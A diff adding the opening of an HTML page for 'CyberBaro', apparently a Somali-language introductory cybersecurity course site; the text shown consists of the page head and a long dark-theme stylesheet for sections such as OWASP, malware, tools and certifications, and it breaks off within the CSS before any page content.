@@ -1,0 +1,1720 @@
+<!DOCTYPE html>
+<html lang="so" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberBaro — From Zero to Hero in Cybersecurity</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+/* ═══════════════ VARIABLES ═══════════════ */
+:root {
+  --ng: #00ff41; --ngd: #00cc33; --ep: #bf00ff; --epd: #8800bb;
+  --cy: #00f5ff; --rd: #ff003c; --gd: #ffd700;
+  --bg1: #020408; --bg2: #050d15;
+  --bgc: rgba(0,20,10,0.6); --bgch: rgba(0,40,20,0.85);
+  --gl: rgba(0,255,65,0.05); --glb: rgba(0,255,65,0.2);
+  --tp: #e0ffe8; --ts: #7dff9a; --tm: #4a8060;
+  --bd: rgba(0,255,65,0.15);
+  --sg: 0 0 20px rgba(0,255,65,0.3);
+  --sp: 0 0 20px rgba(191,0,255,0.3);
+  --sc: 0 0 20px rgba(0,245,255,0.3);
+  --tb: #000d06;
+  --fm: 'Share Tech Mono',monospace;
+  --fd: 'Orbitron',sans-serif;
+  --fb: 'Rajdhani',sans-serif;
+  --tr: 0.3s cubic-bezier(0.4,0,0.2,1);
+}
+[data-theme="light"] {
+  --ng:#00aa22;--ngd:#008818;--ep:#7700cc;--epd:#5500aa;--cy:#0088cc;
+  --bg1:#f0f4f0;--bg2:#e0ece0;--bgc:rgba(220,240,220,0.7);--bgch:rgba(200,230,200,0.9);
+  --gl:rgba(0,180,60,0.08);--glb:rgba(0,150,60,0.3);
+  --tp:#0a1a0a;--ts:#1a5c1a;--tm:#4a7a4a;--bd:rgba(0,150,60,0.25);--tb:#0a0a0a;
+  --sg:0 0 20px rgba(0,170,34,0.2);--sp:0 0 20px rgba(119,0,204,0.2);
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--fb);background:var(--bg1);color:var(--tp);min-height:100vh;overflow-x:hidden;transition:background var(--tr),color var(--tr)}
+#mc{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:.04;pointer-events:none}
+[data-theme="light"] #mc{opacity:.02}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:var(--bg1)}
+::-webkit-scrollbar-thumb{background:var(--ng);border-radius:3px}
+
+/* ═══════════════ NAV ═══════════════ */
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(2,4,8,0.93);backdrop-filter:blur(20px);border-bottom:1px solid var(--bd);height:62px;display:flex;align-items:center;justify-content:space-between;padding:0 1.5rem;transition:all var(--tr)}
+[data-theme="light"] nav{background:rgba(240,244,240,0.95)}
+.nl{display:flex;align-items:center;gap:.15rem;text-decoration:none}
+.li{width:34px;height:34px;border:2px solid var(--ng);border-radius:7px;display:flex;align-items:center;justify-content:center;font-family:var(--fd);font-size:13px;color:var(--ng);box-shadow:var(--sg);animation:pb 2s ease-in-out infinite}
+@keyframes pb{0%,100%{box-shadow:0 0 8px rgba(0,255,65,.3)}50%{box-shadow:0 0 22px rgba(0,255,65,.7)}}
+.lt{font-family:var(--fd);font-size:1.15rem;font-weight:900;color:var(--ng);letter-spacing:2px;text-shadow:0 0 10px rgba(0,255,65,.4);margin-left:.6rem}
+.ltg{font-size:.58rem;color:var(--tm);letter-spacing:1px;display:block;font-family:var(--fm)}
+.nlinks{display:flex;align-items:center;gap:.2rem;list-style:none;flex-wrap:wrap}
+.nlinks a{font-family:var(--fm);font-size:.68rem;color:var(--ts);text-decoration:none;padding:.35rem .6rem;border-radius:4px;border:1px solid transparent;transition:all var(--tr)}
+.nlinks a:hover{color:var(--ng);border-color:var(--bd);background:var(--gl)}
+.nc{display:flex;align-items:center;gap:.6rem}
+.tt{width:40px;height:20px;background:var(--bgc);border:1px solid var(--bd);border-radius:10px;cursor:pointer;position:relative;transition:all var(--tr)}
+.tt::after{content:'';position:absolute;top:2px;left:2px;width:14px;height:14px;border-radius:50%;background:var(--ng);transition:transform var(--tr);box-shadow:0 0 6px rgba(0,255,65,.6)}
+[data-theme="light"] .tt::after{transform:translateX(20px);background:var(--gd);box-shadow:0 0 6px rgba(255,215,0,.7)}
+.tlb{font-family:var(--fm);font-size:.68rem;color:var(--tm)}
+.hb{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px}
+.hb span{display:block;width:22px;height:2px;background:var(--ng);transition:all var(--tr)}
+.mob-nav{display:none;position:fixed;top:62px;left:0;right:0;bottom:0;background:rgba(2,4,8,.98);z-index:999;padding:1.5rem;flex-direction:column;gap:.4rem;overflow-y:auto}
+.mob-nav.open{display:flex}
+.mob-nav a{font-family:var(--fm);font-size:.9rem;color:var(--ts);text-decoration:none;padding:.85rem 1rem;border:1px solid var(--bd);border-radius:8px;transition:all var(--tr)}
+.mob-nav a:hover{color:var(--ng);border-color:var(--ng)}
+
+/* ═══════════════ HERO ═══════════════ */
+.hero{position:relative;z-index:1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:5rem 2rem 3rem;overflow:hidden}
+.hero::before{content:'';position:absolute;top:20%;left:50%;transform:translate(-50%,-50%);width:600px;height:600px;background:radial-gradient(ellipse,rgba(0,255,65,.05) 0%,transparent 70%);pointer-events:none}
+.hbadge{font-family:var(--fm);font-size:.72rem;color:var(--ep);border:1px solid rgba(191,0,255,.4);padding:.3rem .9rem;border-radius:20px;margin-bottom:1.5rem;display:inline-block;letter-spacing:2px;background:rgba(191,0,255,.05);animation:gp 3s ease-in-out infinite}
+@keyframes gp{0%,100%{box-shadow:0 0 5px rgba(191,0,255,.2)}50%{box-shadow:0 0 20px rgba(191,0,255,.5)}}
+.hero h1{font-family:var(--fd);font-size:clamp(2.8rem,8vw,6.5rem);font-weight:900;line-height:1;margin-bottom:.5rem;letter-spacing:-1px}
+.hero h1 .cy{color:var(--ng);text-shadow:0 0 30px rgba(0,255,65,.6);animation:fl 4s infinite}
+@keyframes fl{0%,95%,97%,100%{opacity:1}96%,98%{opacity:.7}}
+.hero h1 .ba{color:var(--ep);text-shadow:0 0 30px rgba(191,0,255,.6)}
+.htag{font-family:var(--fd);font-size:clamp(.85rem,2.5vw,1.25rem);color:var(--cy);letter-spacing:4px;margin-bottom:.75rem;text-shadow:0 0 10px rgba(0,245,255,.5)}
+.hsub{font-size:1.05rem;color:var(--ts);max-width:680px;line-height:1.75;margin-bottom:2rem}
+.hstats{display:flex;gap:2.5rem;justify-content:center;margin-bottom:2rem;flex-wrap:wrap}
+.stat-n{font-family:var(--fd);font-size:2rem;font-weight:900;color:var(--ng);text-shadow:0 0 15px rgba(0,255,65,.5);display:block}
+.stat-l{font-family:var(--fm);font-size:.65rem;color:var(--tm);letter-spacing:1px}
+.hcta{display:flex;gap:.85rem;flex-wrap:wrap;justify-content:center}
+.bp{font-family:var(--fd);font-size:.82rem;font-weight:700;letter-spacing:2px;padding:.85rem 1.8rem;background:linear-gradient(135deg,var(--ng),var(--ngd));color:#000;border:none;border-radius:6px;cursor:pointer;text-decoration:none;transition:all var(--tr);box-shadow:var(--sg)}
+.bp:hover{transform:translateY(-2px);box-shadow:0 0 35px rgba(0,255,65,.6)}
+.bs{font-family:var(--fd);font-size:.82rem;font-weight:700;letter-spacing:2px;padding:.85rem 1.8rem;background:transparent;color:var(--ep);border:1px solid var(--ep);border-radius:6px;cursor:pointer;text-decoration:none;transition:all var(--tr)}
+.bs:hover{background:rgba(191,0,255,.1);box-shadow:var(--sp);transform:translateY(-2px)}
+.hscroll{position:absolute;bottom:1.5rem;left:50%;transform:translateX(-50%);display:flex;flex-direction:column;align-items:center;gap:.4rem;font-family:var(--fm);font-size:.62rem;color:var(--tm);letter-spacing:2px;animation:bounce 2s infinite}
+@keyframes bounce{0%,100%{transform:translateX(-50%) translateY(0)}50%{transform:translateX(-50%) translateY(-8px)}}
+.sarr{width:14px;height:14px;border-right:2px solid var(--ng);border-bottom:2px solid var(--ng);transform:rotate(45deg)}
+
+/* ═══════════════ MAIN / SECTIONS ═══════════════ */
+main{position:relative;z-index:1}
+.sdiv{height:1px;background:linear-gradient(90deg,transparent,var(--ng),var(--ep),transparent);margin:0 2rem;opacity:.25}
+.sec{padding:4.5rem 2rem;max-width:1200px;margin:0 auto}
+.slb{font-family:var(--fm);font-size:.68rem;color:var(--ep);letter-spacing:4px;margin-bottom:.6rem;display:block}
+.stit{font-family:var(--fd);font-size:clamp(1.4rem,4vw,2.3rem);font-weight:900;color:var(--tp);letter-spacing:-.5px;margin-bottom:.85rem}
+.stit .a1{color:var(--ng)}.stit .a2{color:var(--ep)}.stit .a3{color:var(--cy)}
+.sdesc{font-size:1rem;color:var(--ts);line-height:1.75;max-width:720px;margin-bottom:2rem}
+
+/* ═══════════════ CARDS ═══════════════ */
+.card{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.6rem;backdrop-filter:blur(12px);transition:all var(--tr);position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(0,255,65,.03) 0%,transparent 50%);pointer-events:none}
+.card:hover{background:var(--bgch);border-color:var(--ng);box-shadow:var(--sg);transform:translateY(-4px)}
+.ctit{font-family:var(--fd);font-size:.95rem;font-weight:700;color:var(--ng);margin-bottom:.65rem;letter-spacing:1px;display:flex;align-items:center;gap:.5rem}
+.cbody{font-size:.92rem;color:var(--ts);line-height:1.78}
+.cbody strong{color:var(--cy);font-weight:600}
+.cbody ul{padding-left:1.2rem;margin-top:.5rem}
+.cbody ul li{margin-bottom:.4rem}
+.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1.4rem}
+.g3{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.3rem}
+.g4{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1.2rem}
+
+/* ═══════════════ INFO / WARN BOXES ═══════════════ */
+.ib{background:rgba(0,245,255,.05);border:1px solid rgba(0,245,255,.2);border-radius:8px;padding:.9rem 1.1rem;margin:.85rem 0;font-size:.87rem;color:var(--cy);display:flex;gap:.65rem;align-items:flex-start;line-height:1.65}
+.wb{background:rgba(255,0,60,.05);border:1px solid rgba(255,0,60,.2);border-radius:8px;padding:.9rem 1.1rem;margin:.85rem 0;font-size:.87rem;color:var(--rd);display:flex;gap:.65rem;align-items:flex-start;line-height:1.65}
+.gb{background:rgba(0,255,65,.05);border:1px solid rgba(0,255,65,.2);border-radius:8px;padding:.9rem 1.1rem;margin:.85rem 0;font-size:.87rem;color:var(--ng);display:flex;gap:.65rem;align-items:flex-start;line-height:1.65}
+
+/* ═══════════════ CIA TRIAD ═══════════════ */
+.cia{display:grid;grid-template-columns:repeat(3,1fr);gap:1.4rem;margin-bottom:1.5rem}
+.ciac{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.8rem 1.4rem;text-align:center;transition:all var(--tr)}
+.ciac:hover{transform:translateY(-6px)}
+.cc{border-top:3px solid var(--cy)}.ic{border-top:3px solid var(--ng)}.ac{border-top:3px solid var(--ep)}
+.cial{font-family:var(--fd);font-size:3.5rem;font-weight:900;line-height:1;margin-bottom:.4rem}
+.cc .cial{color:var(--cy);text-shadow:0 0 20px rgba(0,245,255,.6)}
+.ic .cial{color:var(--ng);text-shadow:0 0 20px rgba(0,255,65,.6)}
+.ac .cial{color:var(--ep);text-shadow:0 0 20px rgba(191,0,255,.6)}
+.ciaw{font-family:var(--fd);font-size:.72rem;letter-spacing:3px;color:var(--tm);margin-bottom:.85rem}
+.ciad{font-size:.88rem;color:var(--ts);line-height:1.65}
+
+/* ═══════════════ AAA ═══════════════ */
+.aaa{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin:1.5rem 0}
+.aaai{background:var(--bgc);border:1px solid var(--glb);border-radius:10px;padding:1.2rem;text-align:center}
+.aaal{font-family:var(--fd);font-size:2rem;font-weight:900;color:var(--ep);text-shadow:0 0 15px rgba(191,0,255,.5)}
+.aaaw{font-family:var(--fm);font-size:.62rem;color:var(--tm);letter-spacing:1px;margin:.25rem 0}
+.aaas{font-size:.83rem;color:var(--ts);line-height:1.6}
+
+/* ═══════════════ RISK LEVELS ═══════════════ */
+.rlvl{display:flex;flex-direction:column;gap:.4rem;margin-top:1rem}
+.rl{display:flex;align-items:center;gap:.75rem}
+.rln{font-family:var(--fm);font-size:.72rem;min-width:75px}
+.rb{height:7px;border-radius:3px;transition:width .6s ease}
+.rl-c .rln{color:var(--rd)}.rl-c .rb{background:var(--rd);width:100%}
+.rl-h .rln{color:#ff6600}.rl-h .rb{background:#ff6600;width:75%}
+.rl-m .rln{color:var(--gd)}.rl-m .rb{background:var(--gd);width:50%}
+.rl-l .rln{color:var(--ng)}.rl-l .rb{background:var(--ng);width:28%}
+
+/* ═══════════════ CRYPTO COMPARE ═══════════════ */
+.cmc{display:grid;grid-template-columns:1fr 1fr;gap:1.4rem;margin:1.2rem 0}
+.cmc-col{background:var(--bgc);border:1px solid var(--glb);border-radius:10px;padding:1.4rem}
+.cmc-col.enc{border-top:3px solid var(--cy)}.cmc-col.hsh{border-top:3px solid var(--ep)}
+.cmc-t{font-family:var(--fd);font-size:.88rem;font-weight:700;margin-bottom:.85rem}
+.enc .cmc-t{color:var(--cy)}.hsh .cmc-t{color:var(--ep)}
+.cmc-list{list-style:none}
+.cmc-list li{font-size:.83rem;color:var(--ts);padding:.35rem 0;border-bottom:1px solid var(--bd);display:flex;gap:.5rem}
+.cmc-list li::before{content:'▸';color:var(--ng);flex-shrink:0}
+
+/* ═══════════════ PHASE PIPELINE ═══════════════ */
+.pipe{display:flex;flex-direction:column;gap:0;position:relative}
+.pi{display:grid;grid-template-columns:72px 1fr;gap:1.3rem;align-items:start;position:relative}
+.pi:not(:last-child)::after{content:'';position:absolute;left:35px;top:72px;width:2px;height:calc(100% + 0px);background:linear-gradient(to bottom,var(--ng),var(--ep));opacity:.35}
+.pnum{width:72px;height:72px;border:2px solid var(--ng);border-radius:50%;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:var(--fd);flex-shrink:0;position:relative;z-index:1;background:var(--bg1);box-shadow:var(--sg)}
+.pnum span:first-child{font-size:1.3rem;font-weight:900;color:var(--ng);line-height:1}
+.pnum span:last-child{font-size:.48rem;color:var(--tm);letter-spacing:1px}
+.pcont{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.35rem;margin-bottom:1.4rem;transition:all var(--tr)}
+.pcont:hover{border-color:var(--ng);box-shadow:var(--sg)}
+.ptit{font-family:var(--fd);font-size:1rem;color:var(--ng);margin-bottom:.45rem;letter-spacing:1px}
+.pso{font-size:.87rem;color:var(--ts);line-height:1.7;margin-bottom:.65rem}
+.ptags{display:flex;flex-wrap:wrap;gap:.35rem}
+.ttag{font-family:var(--fm);font-size:.67rem;padding:.18rem .45rem;border:1px solid rgba(0,245,255,.3);border-radius:4px;color:var(--cy);background:rgba(0,245,255,.04)}
+
+/* ═══════════════ ROADMAP ═══════════════ */
+.rtabs{display:flex;gap:.45rem;flex-wrap:wrap;margin-bottom:1.8rem}
+.rtab{font-family:var(--fm);font-size:.72rem;padding:.55rem 1.1rem;border:1px solid var(--bd);border-radius:6px;color:var(--tm);background:var(--bgc);cursor:pointer;transition:all var(--tr)}
+.rtab:hover{color:var(--ng);border-color:var(--ng)}
+.rtab.active{color:#000;background:var(--ng);border-color:var(--ng);box-shadow:var(--sg)}
+.rpanel{display:none}.rpanel.active{display:block}
+.rsteps{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:1.3rem}
+.rstep{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.35rem;position:relative;transition:all var(--tr);cursor:pointer}
+.rstep:hover{border-color:var(--ng);box-shadow:var(--sg);transform:translateY(-4px)}
+.rstep.done{border-color:var(--ng);background:rgba(0,255,65,.05)}
+.rstep.done .schk{background:var(--ng);border-color:var(--ng);color:#000}
+.snum{font-family:var(--fd);font-size:.67rem;color:var(--tm);margin-bottom:.6rem;letter-spacing:1px}
+.sich{font-size:1.7rem;margin-bottom:.65rem;display:block}
+.stit2{font-family:var(--fd);font-size:.87rem;color:var(--tp);margin-bottom:.45rem;font-weight:700}
+.sso{font-size:.8rem;color:var(--tm);line-height:1.6}
+.schk{position:absolute;top:.9rem;right:.9rem;width:18px;height:18px;border:2px solid var(--bd);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.65rem;cursor:pointer;transition:all var(--tr)}
+.rprog{margin-top:1.5rem;background:var(--bgc);border:1px solid var(--bd);border-radius:10px;padding:1.1rem 1.3rem;display:flex;align-items:center;gap:1.3rem}
+.prlb{font-family:var(--fm);font-size:.7rem;color:var(--tm);letter-spacing:1px;white-space:nowrap}
+.prbw{flex:1;height:5px;background:rgba(255,255,255,.05);border-radius:3px;overflow:hidden}
+.prb{height:100%;background:linear-gradient(90deg,var(--ng),var(--ep));border-radius:3px;transition:width .6s ease}
+.prp{font-family:var(--fd);font-size:.82rem;color:var(--ng);font-weight:700;min-width:38px;text-align:right}
+
+/* ═══════════════ OWASP ═══════════════ */
+.owg{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:1.2rem}
+.owc{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.4rem;cursor:pointer;transition:all var(--tr);position:relative;overflow:hidden}
+.owc::after{content:'';position:absolute;top:0;left:0;right:0;height:3px}
+.owc.sc::after{background:var(--rd)}.owc.sh::after{background:#ff6600}.owc.sm::after{background:var(--gd)}
+.owc:hover{transform:translateY(-4px);border-color:var(--ng);box-shadow:var(--sg)}
+.owr{font-family:var(--fm);font-size:.62rem;color:var(--tm);letter-spacing:2px;margin-bottom:.4rem}
+.own{font-family:var(--fd);font-size:.92rem;font-weight:700;color:var(--tp);margin-bottom:.65rem}
+.ows{font-size:.83rem;color:var(--ts);line-height:1.65;margin-bottom:.85rem}
+.owsv{font-family:var(--fm);font-size:.62rem;padding:.18rem .55rem;border-radius:4px;letter-spacing:1px}
+.sc .owsv{color:var(--rd);background:rgba(255,0,60,.08);border:1px solid rgba(255,0,60,.25)}
+.sh .owsv{color:#ff6600;background:rgba(255,102,0,.08);border:1px solid rgba(255,102,0,.25)}
+.sm .owsv{color:var(--gd);background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.25)}
+
+/* ═══════════════ TERMINAL ═══════════════ */
+.tw{background:var(--tb);border:1px solid rgba(0,255,65,.3);border-radius:12px;overflow:hidden;box-shadow:0 0 35px rgba(0,255,65,.12);margin-bottom:1.8rem}
+.tbar{background:#0a1a0a;padding:.55rem .9rem;display:flex;align-items:center;gap:.45rem;border-bottom:1px solid rgba(0,255,65,.18)}
+.td{width:11px;height:11px;border-radius:50%}
+.td.r{background:#ff5f57}.td.y{background:#febc2e}.td.g{background:#28c840}
+.ttitle{font-family:var(--fm);font-size:.68rem;color:#4a7a4a;margin-left:.4rem;letter-spacing:1px}
+.tbody{padding:1.35rem;font-family:var(--fm);font-size:.8rem;line-height:1.85;min-height:180px;max-height:380px;overflow-y:auto}
+.tl{margin-bottom:.18rem}
+.t-p{color:var(--ng)}.t-c{color:#e0ffe8}.t-o{color:#5da870;padding-left:.9rem}
+.t-s{color:var(--ng)}.t-e{color:var(--rd)}.t-i{color:var(--cy)}.t-w{color:var(--gd)}.t-pu{color:var(--ep)}
+.tbts{display:flex;flex-wrap:wrap;gap:.6rem;padding:.65rem 1.35rem;background:rgba(0,255,65,.02);border-top:1px solid rgba(0,255,65,.08)}
+.tbtn{font-family:var(--fm);font-size:.68rem;padding:.3rem .75rem;border:1px solid rgba(0,255,65,.28);border-radius:4px;color:var(--ng);background:rgba(0,255,65,.04);cursor:pointer;transition:all var(--tr)}
+.tbtn:hover{background:rgba(0,255,65,.13);box-shadow:0 0 8px rgba(0,255,65,.25)}
+
+/* ═══════════════ ATTACK TABS ═══════════════ */
+.atabs{display:flex;gap:.45rem;margin-bottom:1.8rem;flex-wrap:wrap}
+.atab{font-family:var(--fm);font-size:.72rem;padding:.55rem 1.1rem;border:1px solid var(--bd);border-radius:6px;color:var(--tm);background:var(--bgc);cursor:pointer;transition:all var(--tr)}
+.atab.active{color:#000;background:var(--rd);border-color:var(--rd)}
+.atab:hover:not(.active){border-color:var(--rd);color:var(--rd)}
+.apanel{display:none}.apanel.active{display:block}
+
+/* ═══════════════ HAT CARDS ═══════════════ */
+.hg{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1.2rem}
+.hc{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.4rem;text-align:center;transition:all var(--tr)}
+.hc:hover{transform:translateY(-4px)}
+.he{font-size:2.3rem;margin-bottom:.65rem}
+.hn{font-family:var(--fd);font-size:.87rem;font-weight:700;margin-bottom:.5rem}
+.wh .hn{color:#d0d0d0}.bh .hn{color:#888}.gh .hn{color:#aaa}
+.sk .hn{color:var(--gd)}.st .hn{color:var(--rd)}.hv .hn{color:var(--ep)}
+.hso{font-size:.83rem;color:var(--ts);line-height:1.65}
+
+/* ═══════════════ MALWARE ═══════════════ */
+.mg{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.2rem}
+.mc2{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.4rem;transition:all var(--tr);border-left:3px solid var(--rd)}
+.mc2:hover{border-color:var(--rd);box-shadow:0 0 18px rgba(255,0,60,.18);transform:translateY(-4px)}
+.mi{font-size:1.9rem;margin-bottom:.65rem}
+.mn{font-family:var(--fd);font-size:.92rem;color:var(--rd);font-weight:700;margin-bottom:.4rem;letter-spacing:1px}
+.ms{font-size:.85rem;color:var(--ts);line-height:1.65}
+
+/* ═══════════════ TOOLS ═══════════════ */
+.tg{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:1.4rem}
+.tc{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.65rem;transition:all var(--tr)}
+.tc:hover{border-color:var(--cy);box-shadow:var(--sc);transform:translateY(-4px)}
+.th{display:flex;align-items:center;gap:.9rem;margin-bottom:.9rem}
+.tlo{width:44px;height:44px;border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:1.4rem;flex-shrink:0}
+.tn{font-family:var(--fd);font-size:.95rem;font-weight:700;color:var(--cy);letter-spacing:1px}
+.tty{font-family:var(--fm);font-size:.62rem;color:var(--tm);letter-spacing:1px}
+.tso{font-size:.85rem;color:var(--ts);line-height:1.65;margin-bottom:.85rem}
+.tcmd{background:rgba(0,0,0,.45);border:1px solid rgba(0,245,255,.18);border-radius:6px;padding:.7rem .9rem;font-family:var(--fm);font-size:.73rem;color:var(--cy);white-space:pre;overflow-x:auto}
+
+/* ═══════════════ NUGLAANSHO TYPES ═══════════════ */
+.vg{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:1.3rem}
+.vc{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.5rem;transition:all var(--tr);border-left:3px solid var(--gd)}
+.vc:hover{box-shadow:0 0 18px rgba(255,215,0,.18);transform:translateY(-4px)}
+.vt{font-family:var(--fd);font-size:.92rem;color:var(--gd);font-weight:700;margin-bottom:.45rem}
+.vs{font-size:.85rem;color:var(--ts);line-height:1.68}
+
+/* ═══════════════ SCRIPTING ═══════════════ */
+.scg{display:grid;grid-template-columns:repeat(auto-fit,minmax(270px,1fr));gap:1.4rem}
+.scc{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.65rem;transition:all var(--tr)}
+.scc:hover{transform:translateY(-4px);border-color:var(--ep);box-shadow:var(--sp)}
+.scl{font-family:var(--fd);font-size:1.15rem;font-weight:900;color:var(--ep);margin-bottom:.35rem}
+.scr{font-family:var(--fm);font-size:.67rem;color:var(--tm);margin-bottom:.9rem;letter-spacing:1px}
+.scs{font-size:.85rem;color:var(--ts);line-height:1.7;margin-bottom:.9rem}
+.scuses{display:flex;flex-wrap:wrap;gap:.35rem}
+.scu{font-family:var(--fm);font-size:.65rem;padding:.18rem .5rem;border:1px solid rgba(191,0,255,.28);border-radius:4px;color:var(--ep);background:rgba(191,0,255,.05)}
+
+/* ═══════════════ RESOURCES ═══════════════ */
+.rg{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.4rem}
+.rc{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.65rem;text-decoration:none;display:block;transition:all var(--tr)}
+.rc:hover{border-color:var(--ng);box-shadow:var(--sg);transform:translateY(-4px)}
+.re{font-size:2.3rem;margin-bottom:.85rem}
+.rn{font-family:var(--fd);font-size:1rem;color:var(--ng);margin-bottom:.4rem;font-weight:700}
+.rty{font-family:var(--fm);font-size:.62rem;color:var(--ep);letter-spacing:2px;margin-bottom:.65rem}
+.rs{font-size:.85rem;color:var(--ts);line-height:1.65}
+
+/* ═══════════════ DEFENSE ═══════════════ */
+.dg{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1.2rem}
+.dc{background:var(--bgc);border:1px solid rgba(0,245,255,.15);border-radius:12px;padding:1.4rem;border-left:3px solid var(--cy);transition:all var(--tr)}
+.dc:hover{box-shadow:var(--sc);transform:translateY(-4px)}
+.die{font-size:1.9rem;margin-bottom:.65rem}
+.dit{font-family:var(--fd);font-size:.88rem;color:var(--cy);font-weight:700;margin-bottom:.45rem}
+.dis{font-size:.84rem;color:var(--ts);line-height:1.65}
+
+/* ═══════════════ CERT TIMELINE ═══════════════ */
+.ctt{position:relative;padding-left:2.8rem}
+.ctt::before{content:'';position:absolute;left:12px;top:0;bottom:0;width:2px;background:linear-gradient(to bottom,var(--ng),var(--ep));opacity:.35}
+.cti{position:relative;margin-bottom:1.8rem;background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.4rem;transition:all var(--tr)}
+.cti:hover{border-color:var(--gd);box-shadow:0 0 18px rgba(255,215,0,.18)}
+.cti::before{content:'';position:absolute;left:-1.95rem;top:1.4rem;width:12px;height:12px;border-radius:50%;background:var(--ng);border:2px solid var(--bg1);box-shadow:0 0 7px rgba(0,255,65,.5)}
+.ctlv{font-family:var(--fm);font-size:.62rem;letter-spacing:2px;margin-bottom:.4rem}
+.ctlv.bg{color:var(--ng)}.ctlv.im{color:var(--cy)}.ctlv.av{color:var(--ep)}.ctlv.ex{color:var(--gd)}
+.ctn{font-family:var(--fd);font-size:1.05rem;font-weight:700;color:var(--tp);margin-bottom:.3rem}
+.ctf{font-size:.78rem;color:var(--tm);margin-bottom:.65rem;font-family:var(--fm)}
+.cts{font-size:.88rem;color:var(--ts);line-height:1.68}
+.ctsal{margin-top:.65rem;font-family:var(--fm);font-size:.72rem;color:var(--gd)}
+
+/* ═══════════════ CASE STUDIES ═══════════════ */
+.csg{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1.5rem}
+.csc{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;overflow:hidden;transition:all var(--tr)}
+.csc:hover{transform:translateY(-4px);border-color:var(--rd);box-shadow:0 0 20px rgba(255,0,60,.2)}
+.csh{padding:1.2rem 1.4rem;border-bottom:1px solid var(--bd)}
+.csh-yr{font-family:var(--fm);font-size:.62rem;color:var(--rd);letter-spacing:2px;margin-bottom:.3rem}
+.csh-n{font-family:var(--fd);font-size:1.05rem;font-weight:700;color:var(--tp)}
+.csb{padding:1.2rem 1.4rem}
+.csb p{font-size:.85rem;color:var(--ts);line-height:1.68;margin-bottom:.7rem}
+.csl{font-family:var(--fd);font-size:.75rem;color:var(--ng);letter-spacing:1px;margin-top:.85rem}
+
+/* ═══════════════ DEFENSE IN DEPTH ═══════════════ */
+.did-layers{display:flex;flex-direction:column;gap:1.2rem}
+.did-l{background:var(--bgc);border:1px solid var(--glb);border-radius:12px;padding:1.5rem;position:relative;overflow:hidden;transition:all var(--tr)}
+.did-l:hover{transform:translateY(-3px)}
+.did-l-1{border-left:4px solid var(--rd)}.did-l-2{border-left:4px solid var(--gd)}.did-l-3{border-left:4px solid var(--ng)}
+.did-lt{font-family:var(--fd);font-size:.88rem;font-weight:700;margin-bottom:.5rem}
+.did-l-1 .did-lt{color:var(--rd)}.did-l-2 .did-lt{color:var(--gd)}.did-l-3 .did-lt{color:var(--ng)}
+.did-ls{font-size:.85rem;color:var(--ts);line-height:1.7}
+
+/* ═══════════════ FIREWALL TYPES ═══════════════ */
+.fwg{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:1.2rem}
+.fwc{background:var(--bgc);border:1px solid var(--glb);border-radius:10px;padding:1.3rem;transition:all var(--tr)}
+.fwc:hover{border-color:var(--cy);box-shadow:var(--sc);transform:translateY(-3px)}
+.fwt{font-family:var(--fd);font-size:.85rem;color:var(--cy);font-weight:700;margin-bottom:.45rem}
+.fws{font-size:.83rem;color:var(--ts);line-height:1.65}
+
+/* ═══════════════ CONTACT / FOOTER ═══════════════ */
+.contact{background:linear-gradient(135deg,rgba(0,255,65,.03),rgba(191,0,255,.03));border-top:1px solid var(--bd);border-bottom:1px solid var(--bd);padding:3.5rem 2rem;text-align:center}
+.contact-t{font-family:var(--fd);font-size:1.8rem;font-weight:900;color:var(--ng);margin-bottom:.45rem}
+.contact-s{color:var(--tm);margin-bottom:1.8rem;font-size:.95rem}
+.cls{display:flex;gap:1.3rem;justify-content:center;flex-wrap:wrap;margin-bottom:1.3rem}
+.cl{display:flex;align-items:center;gap:.65rem;font-family:var(--fm);font-size:.82rem;color:var(--tp);text-decoration:none;padding:.78rem 1.35rem;border:1px solid var(--bd);border-radius:8px;background:var(--bgc);transition:all var(--tr)}
